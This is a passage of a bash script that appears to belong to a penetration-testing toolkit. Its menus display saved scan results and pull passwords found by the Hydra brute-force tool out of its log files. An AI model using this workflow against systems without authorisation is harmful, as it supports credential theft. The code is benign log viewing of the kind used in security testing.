			
			select disc_scan_choice in ${disc_scans_array[@]}
			do
				echo -e "You have chosent to view ${Green}$disc_scan_choice${NC}\n"
				disc_stats=$(cat $disc_scan_choice | grep "Host script results" -A300)
				
				echo -e "Host script results: \n"
				echo -e "$disc_stats\n"
				
				echo -e "Would you like to view the full report? [Y/N]"
				read disc_full_report
				
				if [ ${disc_full_report^^} == "Y" ]
				then
					echo -e "${Yellow}Printing full report now...${NC}"
					sleep 1
					
					echo -e "${Yellow}------------------------REPORT START-----------------------------${NC}"
					cat "$disc_scan_choice"
					echo -e "${Yellow}------------------------REPORT END-----------------------------${NC}\n\n"
				
					enum_log
				
				elif [ ${disc_full_report^^} == "N" ]
				then
					echo -e "aReturning to enumeration log menu."
					sleep 1 
					
					enum_log
				
				else
					echo -e "${Red}Invalid option selected.\nTry again!${NC}"
					sleep 1 
					enum_log
				fi
			done
		;;
		
		Log_menu)
			echo -e "Returning to log menu..."
			sleep 1
			log_menu
		;;
		
		*)
			echo -e "${Red}Invalid option. Try again!${NC}"
			sleep 1
			enum_log
		;;
		
		esac
	done
	
}

function exploitation_log()
{
	cd "$hydra_logs_path"
	
	echo -e "\nYou are now located in: ${Green}"
	pwd
	echo -e "${NC}\nWhich Hydra file would you like to view? "
	IFS=$'\n' read -r -d '' -a hydra_logs_array < <(ls | grep "brute_creds" && printf '\0' )
	
	select read_hydra in ${hydra_logs_array[@]} Log_menu
	do
		if [ ${read_hydra} != "Log_menu" ]
		then
			echo -e "You have chosen to view ${Green}$read_hydra${NC}\n"
			hydra_creds=$(cat $read_hydra | grep "password" )
			
			echo -e "Discovered credentials on this file: \n"
			echo -e "$hydra_creds\n\n"
			
			sleep 1
			echo -e "Returning to exploitation log menu."
			sleep 1
			exploitation_log
			
		else
			echo -e "Returning to log menu.."
			sleep 1 
			
			log_menu
		fi
	done
	
	
	
}

ruroot
dircheck
appcheck
intro_screen
